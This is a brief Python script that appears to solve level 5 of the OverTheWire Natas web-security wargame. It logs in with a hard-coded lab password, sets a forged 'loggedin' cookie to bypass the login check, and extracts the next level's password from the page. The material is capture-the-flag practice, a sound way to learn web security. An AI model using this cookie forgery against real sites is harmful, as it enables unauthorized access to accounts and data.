import requests
import re

username ='natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

# head = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
cookies = {"loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
# print (session)

responce = session.get(url, auth = (username, password),cookies = cookies )
content = responce.text
print(session.cookies['loggedin'])
print (content)


print (re.findall('The password for natas6 is (.*)',content)[0])